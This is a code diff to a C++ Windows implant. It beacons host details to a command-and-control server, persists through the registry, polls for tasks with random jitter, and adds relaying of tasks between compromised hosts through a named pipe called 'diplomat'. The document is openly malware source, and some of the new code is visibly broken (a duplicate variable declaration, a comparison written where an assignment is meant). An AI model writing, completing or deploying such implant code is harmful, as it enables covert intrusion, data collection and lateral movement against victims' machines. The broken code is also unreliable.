@@ -24,6 +24,14 @@
 #include <dirent.h>
 #include <iphlpapi.h>
 #include <string>
+#include "json_struct.h"
+
+struct TasksResponse{
+    std::string Path;
+    std::string Tasks;
+
+    JS_OBJ(Path, Tasks);
+};
 
 // Use iphlpapi to get interface info
 void NetworkInterfaces(){
@@ -70,11 +78,11 @@ std::wstring MachineGUID(){
 }
 
 // Retrieve NETBios computer name
-wchar_t* ComputerName(){
-    wchar_t* value = (wchar_t*)malloc(30*sizeof(wchar_t));;
+std::string ComputerName(){
+    char* value = (char*)malloc(30*sizeof(wchar_t));;
 	DWORD size = 30*sizeof(char);
 	RegGetValue(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName"), TEXT("ComputerName"), RRF_RT_REG_SZ, NULL, (PVOID)value, &size);
-	return value;
+	return std::string(value);
 }
 
 // Retrieve current user
@@ -154,8 +162,8 @@ void RegisterC2(){
                 wchar_t* OSRelease = OSName();
                 wchar_t* OSBuild = OSVersion();
                 wchar_t* username = CurrentUser();
-                wchar_t* computerName = ComputerName();
-                sprintf(jsonData, "{ \"ProductID\": \"%s\", \"OSName\": \"%s\", \"OSBuild\": \"%s\", \"Username\": \"%s\", \"ComputerName\": \"%s\" }", productID, OSRelease, OSBuild, username, computerName);
+                std::string computerName = ComputerName();
+                sprintf(jsonData, "{ \"ProductID\": \"%s\", \"OSName\": \"%s\", \"OSBuild\": \"%s\", \"Username\": \"%s\", \"ComputerName\": \"%s\" }", productID, OSRelease, OSBuild, username, computerName.c_str());
                 size_t size = strlen(jsonData) * sizeof(char);
 
                 BOOL result = WinHttpSendRequest(
@@ -279,6 +287,8 @@ void PersistMe(){
     RegCloseKey(key);
 }
 
+
+// TODO: separate code for http egress node from mesh node
 int _tmain(int argc, _TCHAR *argv[]){
     if(argc == 1){
         // Report intrusion to C2
@@ -296,20 +306,93 @@ int _tmain(int argc, _TCHAR *argv[]){
             0,
             NULL
         );
+        printf("server created\n");
 
         // Periodically check for new commands from C2
         while(1){
+            // the start of this section should only be happening on the egress node
             wchar_t* tasks = GetTasks();
-            wprintf(L"%s\n", tasks);
 
-            //std::wstring path(L"HOST1, HOST2, HOST4");
+            JS::ParseContext context((char*)tasks);
+            TasksResponse tr;
+            if (context.parseTo(tr) != JS::Error::NoError)
+            {
+                std::string errorStr = context.makeErrorString();
+                fprintf(stderr, "Error parsing struct %s\n", errorStr.c_str());
+                return -1;
+            }
 
-            // if path != NETBios name
-                // alter path and send message to next node
-                // if next node has response in named pipe server
-                    // take response and back propagate
-            // else
-                // execute tasks and put response in named pipe server
+            printf("Path: %s\n", tr.Path.c_str());
+            printf("Tasks: %s\n", tr.Tasks.c_str());
+
+            std::string hostname = ComputerName();
+            if(tr.Path.compare(hostname) == 0){
+                // THIS IS THE DESTINATION, execute tasks
+
+            }else{
+                // Remove current hostname from path
+                int index = tr.Path.find(',');
+                tr.Path = tr.Path.substr(index+1);
+                // Get name of next host in path
+                int index = tr.Path.find(',');
+                std::string nextHostname;
+                if(index == -1){
+                    nextHostname == tr.Path;
+                }else{
+                    nextHostname = tr.Path.substr(0, index);
+                }
+                std::string filePath = "\\\\" + nextHostname + "\\pipe\\diplomat";
+                printf("%s\n", filePath);
+
+                // OK WE GO NEXT
+                HANDLE hNextImplant = CreateFileA(
+                    filePath.c_str(),
+                    GENERIC_READ | GENERIC_WRITE,
+                    FILE_SHARE_WRITE,
+                    NULL,
+                    OPEN_EXISTING,
+                    FILE_ATTRIBUTE_NORMAL,
+                    NULL
+                );
+
+                // ANYTHING IN HERE??
+                DWORD bytesRead;
+                void* buffer = malloc(1024);
+                ReadFile(
+                    hNextImplant,
+                    buffer,
+                    1023,
+                    &bytesRead,
+                    NULL
+                );
+
+                if(bytesRead != 0){
+                    // contained data
+                    // stick it in my own pipe
+                    DWORD bytesWritten;
+                    WriteFile(
+                        hServer,
+                        buffer,
+                        bytesRead,
+                        &bytesWritten,
+                        NULL
+                    );
+                }
+
+                // HERE, HAVE MY STRING
+                std::string json = JS::serializeStruct(tr);
+                DWORD bytesWritten;
+                WriteFile(
+                    hNextImplant,
+                    json.c_str(),
+                    json.size(),
+                    &bytesWritten,
+                    NULL
+                );
+                
+                CloseHandle(hNextImplant);
+                free(buffer);
+            }
 
             int jitter = (rand() % 20000) - 10000;
             Sleep(30000+jitter);
